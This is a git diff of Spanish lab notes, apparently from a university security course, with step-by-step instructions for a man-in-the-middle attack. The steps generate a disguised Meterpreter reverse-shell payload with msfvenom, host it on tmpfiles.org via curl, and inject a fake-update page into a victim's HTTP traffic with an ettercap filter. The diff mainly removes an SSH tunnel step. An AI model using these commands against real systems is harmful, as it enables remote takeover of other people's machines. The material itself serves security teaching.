@@ -993,23 +993,8 @@ Creamos una ventanita en la que la víctima tiene que entrar. Va abrir un html n
 <br>
 
 **PASOS**:
-1-Creamos un túnel:
-```
-ssh -R 4444:localhost:4444 lsi@10.11.48.175
-```
-Crea un "puente secreto" entre tu máquina y la de tu compañero.
 
-    En la víctima: Abre el puerto 4444
-
-    En tu máquina: Recibe las conexiones del puerto 4444 de la víctima
-
-    El payload se conecta a 127.0.0.1:4444 (local en la víctima)
-
-    El túnel redirige esa conexión a tu Metasploit
-
-Con esto no necesitaremos más adelante que la víctima acepte permisos.
-
-2-Creamos payload:
+1-Creamos payload:
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > actualizacion.bin
 ```
@@ -1029,7 +1014,7 @@ msfvenom es la herramienta de metaspolit que genera payloads.
 
 <br>
 
-3-Permisos
+2-Permisos
 ```bash
 chmod +x actualizacion.bin
 ```
@@ -1039,7 +1024,7 @@ Convierte el archivo en un programa que puede ejecutarse en Linux.
 <br>
 
 
-4-Subir el payload y el script a Internet:
+3-Subir el payload y el script a Internet:
 ```bash
 curl -F "file=@actualizacion.bin" https://tmpfiles.org/api/v1/upload
 ```
@@ -1049,7 +1034,7 @@ o manualmente en  tmpfiles.org
 
 Cada vez que tengamos una URL nuevo tenemos que cambiarla abajo en el filtro (SIGUIENTE PASO).
 
-5-Crear el filtro ettercap:
+4-Crear el filtro ettercap:
 ```html:
 if (ip.proto == TCP && tcp.dst == 80) {
     if (search(DATA.data, "Accept-Encoding")) {
@@ -1070,7 +1055,7 @@ Esta página usa Ingeniería Social, le sale a la víctima en cualquier página 
 
 <br>
 
-6-Compilarlo:
+5-Compilarlo:
 ```bash
 etterfilter filtro.filter -o filtro.ef
 ```
@@ -1154,8 +1139,7 @@ shell            # Acceder a la terminal normal de la víctima
 
 #### RESUMEN FÁCIL:
 
-TÚNEL SSH ←→ PAYLOAD LOCAL ←→ VÍCTIMA ←→ ETTERCAP ←→ METASPLOIT
-
+PAYLOAD LOCAL ←→ VÍCTIMA ←→ ETTERCAP ←→ METASPLOIT
 
 
 <br>
@@ -2965,6 +2949,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
